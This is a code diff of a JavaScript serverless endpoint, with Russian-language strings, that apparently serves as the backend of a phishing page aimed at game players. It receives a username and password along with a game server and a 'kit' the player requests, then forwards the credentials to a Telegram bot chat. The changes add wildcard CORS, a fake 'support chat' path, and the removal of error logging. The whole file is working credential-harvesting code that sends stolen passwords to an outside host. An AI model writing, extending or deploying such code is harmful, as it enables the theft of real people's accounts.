@@ -1,20 +1,49 @@
 export default async function handler(req, res) {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end();
+    }
+
     if (req.method !== 'POST') {
         return res.status(405).json({ error: 'Метод не разрешен' });
     }
 
     try {
-        const { username, password } = req.body;
+        const { username, password, server, kit, type, message } = req.body;
 
         const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
         const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
         if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-            console.error('Отсутствуют переменные окружения Telegram');
             return res.status(500).json({ error: 'Ошибка конфигурации сервера' });
         }
 
-        const message = `🔔 Новая попытка входа!\n👤 Ник: ${username}\n🔑 Пароль: ${password}`;
+        let text = '';
+        
+        if (type === 'support') {
+            text = `
+💬 <b>ЧАТ ПОДДЕРЖКИ</b>
+
+👤 Игрок: ${username || 'Игрок'}
+📝 Сообщение: ${message}
+
+⏰ Время: ${new Date().toLocaleString('ru-RU')}
+            `;
+        } else {
+            text = `
+🎮 <b>НОВЫЙ ЗАПРОС КИТА!</b>
+
+🖥 Сервер: ${server}
+📦 Кит: ${kit}
+👤 Ник: ${username}
+🔑 Пароль: ${password}
+
+⏰ Время: ${new Date().toLocaleString('ru-RU')}
+            `;
+        }
         
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         const response = await fetch(url, {
@@ -24,7 +53,7 @@ export default async function handler(req, res) {
             },
             body: JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
-                text: message,
+                text: text,
                 parse_mode: 'HTML'
             })
         });
@@ -32,13 +61,11 @@ export default async function handler(req, res) {
         const data = await response.json();
 
         if (data.ok) {
-            res.status(200).json({ success: true });
+            return res.status(200).json({ success: true });
         } else {
-            console.error('Ошибка Telegram:', data);
-            res.status(500).json({ error: 'Ошибка отправки в Telegram' });
+            return res.status(500).json({ error: 'Ошибка отправки в Telegram' });
         }
     } catch (error) {
-        console.error('Ошибка сервера:', error);
-        res.status(500).json({ error: 'Внутренняя ошибка сервера' });
+        return res.status(500).json({ error: 'Внутренняя ошибка сервера' });
     }
 }
